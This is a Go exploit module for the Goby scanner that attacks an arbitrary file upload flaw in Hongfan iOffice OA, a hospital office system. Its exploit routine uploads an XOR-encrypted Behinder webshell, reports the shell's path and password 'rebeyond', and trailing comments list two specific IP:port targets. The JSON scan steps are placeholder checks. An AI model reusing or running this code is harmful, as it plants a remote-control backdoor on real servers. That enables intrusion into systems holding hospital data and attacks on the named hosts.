package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "iOffice OA iorepsavexml.aspx Arbitrary File Upload Vulnerability",
    "Description": "<p>Hongfan OA is an oA function that provides hospitals with information release, process approval, document management, schedule management, work arrangement, file delivery, online communication and other administrative office services.</p><p>There is an arbitrary file upload vulnerability in the Hongfan OA iorepsavexml.aspx file. Attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Product": "ioffice",
    "Homepage": "http://www.ioffice.cn/",
    "DisclosureDate": "2023-02-10",
    "Author": "h1ei1",
    "FofaQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "GobyQuery": "title=\"iOffice.net\" || body=\"/iOffice/js\" || (body=\"iOffice.net\" && header!=\"couchdb\" && header!=\"drupal\") || body=\"iOfficeOcxSetup.exe\" || body=\"Hongfan. All Rights Reserved\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file upload vulnerability in the Hongfan OA iorepsavexml.aspx file. Attackers can upload malicious Trojan horses to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"http://www.ioffice.cn/.\">http://www.ioffice.cn/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "红帆-ioffice iorepsavexml.aspx 任意文件上传漏洞",
            "Product": "红帆-ioffice",
            "Description": "<p>红帆OA 是一款为医院提供oA功能,完成信息发布、流程审批、公文管理、日程管理、工作安排、文件传递、在线沟通等行政办公业务。<br></p><p>红帆OA iorepsavexml.aspx文件存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁请及时关注官网更新：<a href=\"http://www.ioffice.cn/\">http://www.ioffice.cn/</a>。<br></p>",
            "Impact": "<p>红帆OA iorepsavexml.aspx文件存在任意文件上传漏洞，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "iOffice OA iorepsavexml.aspx Arbitrary File Upload Vulnerability",
            "Product": "ioffice",
            "Description": "<p>Hongfan OA is an oA function that provides hospitals with information release, process approval, document management, schedule management, work arrangement, file delivery, online communication and other administrative office services.<br></p><p>There is an arbitrary file upload vulnerability in the Hongfan OA iorepsavexml.aspx file. Attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"http://www.ioffice.cn/.\">http://www.ioffice.cn/.</a><br></p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in the Hongfan OA iorepsavexml.aspx file. Attackers can upload malicious Trojan horses to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=xxxa.asp&filepath=/upfiles/rep/pic/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "ASP.NET_SessionId=1zt2vw55hafeo255s5s4u3ah; ASPSESSIONIDCSRCSSTR=CBFJFOEDDEPCLINOGJDHELHD")
			cfg.Data = "<%\r\n Response.Write chr(101)&chr(49)&chr(54)&chr(53)&chr(52)&chr(50)&chr(49)&chr(49)&chr(49)&chr(48)&chr(98)&chr(97)&chr(48)&chr(51)&chr(48)&chr(57)&chr(57)&chr(97)&chr(49)&chr(99)&chr(48)&chr(51)&chr(57)&chr(51)&chr(51)&chr(55)&chr(51)&chr(99)&chr(53)&chr(98)&chr(52)&chr(51)\r\nCreateObject(\"Scripting.FileSystemObject\").DeleteFile(server.mappath(Request.ServerVariables(\"SCRIPT_NAME\")))\r\n %>"
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {

				uri2 := "/iOffice/upfiles/rep/pic/xxxa.asp"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")

				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=xxxa.asp&filepath=/upfiles/rep/pic/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "ASP.NET_SessionId=1zt2vw55hafeo255s5s4u3ah; ASPSESSIONIDCSRCSSTR=CBFJFOEDDEPCLINOGJDHELHD")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "<%\r\nResponse.CharSet = \"UTF-8\" \r\nk=\"e45e329feb5d925b\"\r\nSession(\"k\")=k\r\nsize=Request.TotalBytes\r\ncontent=Request.BinaryRead(size)\r\nFor i=1 To size\r\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\r\nNext\r\nexecute(result)\r\n%>"

			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = "Webshell: " + expResult.HostInfo.FixedHostInfo + "/iOffice/upfiles/rep/pic/xxxa.asp\n"
				expResult.Output += "Password：rebeyond\n"
				expResult.Output += "Webshell tool: Behinder v3.0"
				expResult.Success = true
			}
			return expResult
		},
	))
}

//61.186.42.142:8088
//111.75.213.233:8888 这个不太行